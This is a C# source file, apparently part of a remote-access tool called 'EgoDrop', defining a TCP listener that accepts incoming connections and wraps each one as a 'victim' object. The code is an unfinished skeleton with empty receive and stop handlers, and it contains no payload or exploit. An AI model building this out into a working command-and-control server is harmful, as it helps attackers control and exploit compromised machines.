using System;
using System.Collections.Generic;
using System.Configuration;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    internal class clsTcpListener : clsListener
    {
        private Socket m_sktSrv;
        private ListenerType lisType;

        public clsTcpListener(string szName, int nPort, string szDescription)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;

            m_sktSrv = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            lisType = ListenerType.TCP;
        }

        public override void fnStart()
        {
            m_sktSrv.SendTimeout = -1;
            m_sktSrv.ReceiveTimeout = -1;
            m_sktSrv.Bind(new IPEndPoint(IPAddress.Any, m_nPort));
            m_sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), m_sktSrv);
        }

        public override void fnStop()
        {

        }

        private void fnBeginAcceptCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            Socket sktSrv = (Socket)ar.AsyncState;
            try
            {
                Socket sktClnt = sktSrv.EndAccept(ar);
                sktSrv.BeginAccept(new AsyncCallback(fnBeginAcceptCallback), sktSrv);

                clsVictim victim = new clsVictim(sktClnt);
                sktClnt.BeginReceive(
                    victim.m_abBuffer,
                    0,
                    victim.m_abBuffer.Length,
                    SocketFlags.None,
                    new AsyncCallback(fnBeginRecvCallback), victim
                );
            }
            catch (Exception ex)
            {

            }
        }

        private void fnBeginRecvCallback(IAsyncResult ar)
        {
            if (ar == null || ar.AsyncState == null)
                return;

            clsVictim victim = (clsVictim)ar.AsyncState;
            try
            {

            }
            catch (Exception ex)
            {
                Socket sktClnt = victim.m_sktClnt;

            }
        }
    }
}
